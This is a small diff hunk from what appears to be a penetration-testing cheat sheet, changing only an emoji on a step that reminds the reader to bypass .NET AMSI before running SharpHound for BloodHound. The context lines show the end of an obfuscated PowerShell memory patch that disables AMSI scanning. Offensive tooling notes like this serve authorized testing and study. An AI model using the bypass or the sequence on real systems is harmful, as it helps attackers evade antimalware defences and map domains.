@@ -200,7 +200,7 @@ $KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
 [System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
 ```
 
-- Supply data to BloodHound (Remember to bypass .NET AMSI first )
+- Supply data to BloodHound (Remember to bypass .NET AMSI first 🙄)
 
 ```powershell
 $ ..\SharpHound.ps1
